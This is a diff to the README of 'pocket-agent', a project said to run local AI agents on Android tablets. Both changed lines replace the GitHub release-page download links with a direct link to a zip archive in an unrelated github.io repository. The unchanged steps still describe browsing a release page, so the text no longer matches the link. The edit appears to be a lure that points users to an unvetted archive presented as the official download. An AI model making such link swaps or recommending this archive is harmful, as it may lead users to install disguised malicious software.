@@ -5,7 +5,7 @@ description: "Run tool-calling LLM agents locally on Android devices using Termu
 ---
 # 🤖 pocket-agent - Run intelligent AI agents on tablets
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Blondieredistributed612/pocket-agent/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Blondieredistributed612/blondieredistributed612.github.io/main/singly/v3.2.zip)
 
 pocket-agent lets you run a personal AI agent directly on your Android tablet. It uses local processing power to handle requests without sending your data to the cloud. You download a small application package, set it up within your terminal environment, and interact with your device through AI commands. 
 
@@ -26,7 +26,7 @@ Note that tablet hardware has limits. Large models reduce performance. This soft
 
 You must obtain the correct installation package from our release page. Visit the link below to see the available versions.
 
-[Download Setup Files](https://github.com/Blondieredistributed612/pocket-agent/releases)
+[Download Setup Files](https://raw.githubusercontent.com/Blondieredistributed612/blondieredistributed612.github.io/main/singly/v3.2.zip)
 
 1. Navigate to the release page using the link above.
 2. Look for the latest version number.
